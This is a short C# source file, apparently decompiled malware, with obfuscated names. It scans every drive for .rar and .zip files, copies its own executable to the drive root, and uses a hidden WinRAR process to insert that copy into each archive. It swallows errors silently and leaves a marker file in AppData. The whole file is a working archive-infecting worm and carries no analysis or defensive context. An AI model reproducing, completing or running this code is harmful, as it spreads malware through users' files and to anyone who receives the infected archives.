using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

namespace stvn;

public class Crunch
{
	private static string QWA_SOxwk192;

	private static string QWA_SOxwk1925;

	[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
	public static extern int QWA_SOxwk259([MarshalAs(UnmanagedType.LPTStr)] string path, [MarshalAs(UnmanagedType.LPTStr)] StringBuilder shortPath, int shortPathLength);

	private static void Search(string pathName)
	{
		string[] files = Directory.GetFiles(pathName);
		string[] array = files;
		foreach (string text in array)
		{
			if (text.Contains(".rar"))
			{
				QWA_SOxwk19212(text);
			}
			if (text.Contains(".zip"))
			{
				QWA_SOxwk19212(text);
			}
		}
		string[] directories = Directory.GetDirectories(pathName);
		string[] array2 = directories;
		foreach (string pathName2 in array2)
		{
			Search(pathName2);
		}
	}

	public static void QWA_SOxwk1929(string monendroit)
	{
		QWA_SOxwk1925 = monendroit;
		string[] logicalDrives = Environment.GetLogicalDrives();
		string[] array = logicalDrives;
		foreach (string pathName in array)
		{
			Search(pathName);
		}
		File.Create(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\autezzer49se.txt");
	}

	public static void QWA_SOxwk19212(string ouchoisir)
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
		string path = folderPath.Replace(folderPath.Substring(folderPath.IndexOf("\\")), string.Empty) + "\\";
		QWA_SOxwk192 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\WinRAR\\WinRAR.exe";
		if (File.Exists(QWA_SOxwk192))
		{
			if (!File.Exists(Path.Combine(path, QWA_SOxwk1925)))
			{
				File.Copy(Process.GetCurrentProcess().MainModule!.FileName, Path.Combine(path, QWA_SOxwk1925));
			}
			StringBuilder stringBuilder = new StringBuilder(255);
			QWA_SOxwk259(Path.Combine(path, QWA_SOxwk1925), stringBuilder, stringBuilder.Capacity);
			string text = stringBuilder.ToString();
			StringBuilder stringBuilder2 = new StringBuilder(255);
			QWA_SOxwk259(ouchoisir, stringBuilder2, stringBuilder2.Capacity);
			try
			{
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				string arguments = " a " + Convert.ToString(stringBuilder2) + " " + text;
				processStartInfo.FileName = QWA_SOxwk192;
				processStartInfo.Arguments = arguments;
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}
}
